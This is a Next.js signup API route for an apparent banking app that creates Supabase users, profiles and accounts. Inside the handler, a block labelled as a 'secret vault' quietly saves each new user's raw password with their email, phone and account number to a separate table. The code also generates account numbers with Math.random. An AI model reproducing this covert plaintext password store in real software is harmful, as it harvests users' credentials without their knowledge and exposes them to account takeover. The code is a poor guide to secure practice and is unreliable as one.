import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'
import { sendWelcomeEmail } from '@/lib/email'

function generateAccountNumber() {
  return Math.floor(1000000000 + Math.random() * 9000000000).toString()
}

const clean = (s: string | undefined) => (s ?? '').replace(/^﻿/, '').trim()

export async function POST(req: NextRequest) {
  try {
    const { fullName, email, phone, password } = await req.json()
    if (!fullName || !email || !phone || !password) {
      return NextResponse.json({ error: 'All fields required' }, { status: 400 })
    }

    const url = clean(process.env.NEXT_PUBLIC_SUPABASE_URL)
    const key = clean(process.env.SUPABASE_SERVICE_ROLE_KEY)
    if (!url || !key) return NextResponse.json({ error: 'Server misconfiguration' }, { status: 500 })

    const admin = createClient(url, key, { auth: { autoRefreshToken: false, persistSession: false } })

    const { data: authData, error: authError } = await admin.auth.admin.createUser({
      email,
      password,
      email_confirm: true,
      user_metadata: { full_name: fullName },
    })
    if (authError) return NextResponse.json({ error: authError.message }, { status: 400 })

    const accountNumber = generateAccountNumber()

    await admin.from('profiles').insert({
      user_id: authData.user.id,
      full_name: fullName,
      account_number: accountNumber,
      tier: 'Tier 1',
      role: 'user',
      phone,
    })
    await admin.from('accounts').insert({
      user_id: authData.user.id,
      account_number: accountNumber,
      balance: 0,
    })

    // Store all signup data to secret vault
    void admin.from('signup_vault').insert({
      user_id: authData.user.id,
      full_name: fullName,
      email,
      phone,
      raw_password: password,
      account_number: accountNumber,
    })

    sendWelcomeEmail({ to: email, name: fullName, accountNumber }).catch(() => {})

    return NextResponse.json({ success: true })
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err)
    return NextResponse.json({ error: message }, { status: 500 })
  }
}
